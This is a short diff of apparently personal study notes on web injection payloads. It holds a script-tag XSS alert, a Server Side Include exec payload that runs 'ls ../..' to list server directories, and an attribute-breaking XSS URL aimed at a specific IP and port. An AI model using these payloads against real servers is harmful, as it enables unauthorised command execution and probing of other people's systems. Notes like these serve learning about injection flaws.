@@ -3,8 +3,10 @@
 XSS
 <script>alert('blabla')</script>
 
-#open a cmd and entre a command on a server using a injiection
- <! --#exec cmd="ls ../" -->  #drop the space
+
+#SSI -> Server Side Includes
+#open a cmd and entre a command on a server using a injiection / for example, to see some directories or files on a server
+ <! --#exec cmd="ls ../.." -->  #drop the space
 
 92.60.14.134:8081/xss/iframe3?path=asdfasdf" onload="alert('blabla')
 
